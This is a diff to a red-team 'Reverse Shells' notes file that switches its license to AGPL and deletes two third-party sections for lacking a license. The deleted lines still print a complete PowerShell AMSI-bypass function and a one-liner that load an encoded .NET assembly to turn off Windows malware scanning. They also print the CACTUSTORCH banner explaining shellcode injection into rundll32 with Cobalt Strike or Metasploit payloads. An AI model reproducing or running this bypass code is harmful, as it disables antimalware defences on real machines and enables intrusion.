@@ -1,13 +1,14 @@
 <!---------------------------------------------------------------------------------
 Copyright: (c) BLS OPS LLC.
 This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, version 3.
+it under the terms of the GNU Affero General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-GNU General Public License for more details.
-You should have received a copy of the GNU General Public License
+GNU Affero General Public License for more details.
+You should have received a copy of the GNU Affero General Public License
 along with this program. If not, see <https://www.gnu.org/licenses/>.
 --------------------------------------------------------------------------------->
 # Reverse Shells
@@ -174,24 +175,8 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 		* <details><summary>References (Click to expand)</summary><p>
 			* [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
 		* <details><summary>Process (Click to expand)</summary><p>
-			1. Define function:
-
-					function Bypass-AMSI
-					{
-						if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
-							$e = [System.IO.MemoryStream]::new()
-							([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String("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")), ([IO.Compression.CompressionMode]::Decompress))).CopyTo($e)
-							[Reflection.Assembly]::Load($e.ToArray()) | Out-Null
-						}
-						[Bypass.AMSI]::Disable()
-					}
-			1. Execute
-				* Option 1: Call Function **Bypass-AMSI**
-				* Option 2: Use the one-liner.  (Add payload to end, encode, then call with "powershell -enc <encoded_payload>")
-
-					[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(ONELINER_HERE))
-
-					if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {$e = [System.IO.MemoryStream]::new();([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String("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")), ([IO.Compression.CompressionMode]::Decompress))).CopyTo($e);[Reflection.Assembly]::Load($e.ToArray()) | Out-Null};[Bypass.AMSI]::Disable()
+			Removed by Black Lantern Security on 2026-10-23: third-party Bypass-AMSI wrapper and one-liner by Andre Marques (0x00-0x00),
+			no license found. Obtain it from the reference above. See THIRD_PARTY_NOTICES.md.
 			* [Source code](Testaments_and_Books/Redvelations/Windows/Payloads/PowerShell_AMSI_Bypass.cs)
 * <details><summary>Powershell Download & Execute (Click to expand)</summary><p>
 	* Executable:
@@ -253,29 +238,8 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 			* Local Copy [CactusTorch.js Payload](Testaments_and_Books/Redvelations/Windows/Payloads/CactusTorch.js)
 		1. Run CactusTorch
 			* Example Output (Help Output)
-
-					  .
-					  (	(	   (	*   )	  )\ )  *   ) ( /(  )\ )  (   ( /(
-					  )\   )\	  )\ ` )  /(   ( (()/(` )  /( )\())(()/(  )\  )\())
-					 (((_|(((_)(  (((_) ( )(_))  )\ /(_))( )(_)|(_)\  /(_)|((_)((_)\
-					 )\___)\ _ )\ )\___(_(_())_ ((_|_)) (_(_())  ((_)(_)) )\___ _((_)
-					((/ __(_)_\(_|(/ __|_   _| | | / __||_   _| / _ \| _ ((/ __| || |
-					 | (__ / _ \  | (__  | | | |_| \__ \  | |  | (_) |   /| (__| __ |
-					  \___/_/ \_\  \___| |_|  \___/|___/  |_|   \___/|_|_\ \___|_||_|
-																					
-				   Author: Vincent Yiu (@vysecurity)
-				   Credits:
-					 - @cn33liz: Inspiration with StarFighter
-					 - @tiraniddo: James Forshaw for DotNet2JScript
-					 - @armitagehacker: Raphael Mudge for idea of selecting 32 bit version on 64 bit architecture machines for injection into
-				
-				   A JavaScript and VBScript shellcode launcher. This will spawn a 32 bit version of the binary specified and inject shellcode into it.
-				
-				   Usage:
-				   Choose a binary you want to inject into, default "rundll32.exe", you can use notepad.exe, calc.exe for example...
-				   Generate a 32 bit raw shellcode in whatever framework you want. Tested: Cobalt Strike, Metasploit Framework
-				   Run: cat payload.bin | base64 -w 0
-				   Copy the base64 encoded payload into the code variable below.
+					Removed by Black Lantern Security on 2026-10-23: third-party CACTUSTORCH help banner by Vincent Yiu (@vysecurity),
+					no license found. Obtain it from https://github.com/vysecurity/CACTUSTORCH. See THIRD_PARTY_NOTICES.md.
 
 		1. Generate a payload, encode in base64
 			* msfvenom
